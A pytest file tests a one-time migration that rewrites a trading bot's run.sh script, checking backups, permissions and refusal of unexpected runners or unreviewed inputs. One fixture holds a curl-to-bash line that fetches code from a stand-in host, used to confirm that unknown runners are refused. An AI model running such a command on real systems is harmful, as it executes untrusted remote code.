"""One-time migration never silently changes an unknown live runner."""

import os

import pytest

from deploy.freeze_legacy_runner import install_staged_then_migrate, migrate


def _setup(tmp_path, runner_content):
    root = tmp_path / "checkout"
    src = root / "live" / "legacy_input_sync.py"
    src.parent.mkdir(parents=True)
    src.write_text("pass\n")
    runner = tmp_path / "run.sh"
    runner.write_text(runner_content)
    runner.chmod(0o755)
    return root, runner


def test_atomically_freezes_exact_runner_and_preserves_backup(tmp_path):
    old = (
        "#!/usr/bin/env bash\n"
        "cd /home/trader/sports-market-maker\n"
        "git pull -q --rebase origin main || true\n"
        "echo remaining-trading-logic\n"
    )
    root, runner = _setup(tmp_path, old)
    assert migrate(root, runner) == "migrated"
    assert "git pull" not in runner.read_text()
    assert ".venv/bin/python -m live.legacy_input_sync" in runner.read_text()
    assert "remaining-trading-logic" in runner.read_text()
    backup = runner.with_name("run.sh.pre_data_sync.bak")
    assert backup.read_text() == old
    assert runner.stat().st_mode & 0o777 == 0o755
    assert backup.stat().st_mode & 0o777 == 0o600
    assert runner.stat().st_uid == os.getuid()
    assert migrate(root, runner) == "already_migrated"


def test_refuse_unknown_runner_without_changing_it(tmp_path):
    root, runner = _setup(
        tmp_path,
        "cd /home/trader/sports-market-maker\ncurl https://random.example | bash\n",
    )
    with pytest.raises(RuntimeError, match="Unexpected runner"):
        migrate(root, runner)
    assert not runner.with_name("run.sh.pre_data_sync.bak").exists()


def test_refuse_missing_verified_refresh_module(tmp_path):
    root, runner = _setup(
        tmp_path,
        "cd /home/trader/sports-market-maker\n"
        "git pull -q --rebase origin main || true\n",
    )
    (root / "live/legacy_input_sync.py").unlink()
    with pytest.raises(RuntimeError, match="not installed"):
        migrate(root, runner)
    assert "git pull" in runner.read_text()


def test_staged_install_prepares_missing_imports_before_switching(tmp_path):
    old = (
        "#!/usr/bin/env bash\n"
        "cd /home/trader/sports-market-maker\n"
        "git pull -q --rebase origin main || true\n"
    )
    root, runner = _setup(tmp_path, old)
    (root / "live/legacy_input_sync.py").unlink()
    stage = tmp_path / "staged"
    stage.mkdir()
    (stage / "nba_inputs.py").write_text("SCHEMA = 2\n")
    (stage / "legacy_input_sync.py").write_text("INTERVAL_SECONDS = 600\n")
    assert install_staged_then_migrate(stage, root, runner) == "migrated"
    assert (root / "live/nba_inputs.py").read_text() == "SCHEMA = 2\n"
    assert "git pull" not in runner.read_text()
    assert "git pull" in runner.with_name("run.sh.pre_data_sync.bak").read_text()


def test_staged_migration_refuses_unexpected_existing_input_without_runner_mutation(
    tmp_path,
):
    old = (
        "cd /home/trader/sports-market-maker\n"
        "git pull -q --rebase origin main || true\n"
    )
    root, runner = _setup(tmp_path, old)
    stage = tmp_path / "staged"
    stage.mkdir()
    (stage / "nba_inputs.py").write_text("NEW\n")
    (stage / "legacy_input_sync.py").write_text("pass\n")
    (root / "live/nba_inputs.py").write_text("UNREVIEWED\n")
    with pytest.raises(RuntimeError, match="differs"):
        install_staged_then_migrate(stage, root, runner)
    assert runner.read_text() == old
    assert (root / "live/nba_inputs.py").read_text() == "UNREVIEWED\n"
    assert not runner.with_name("run.sh.pre_data_sync.bak").exists()
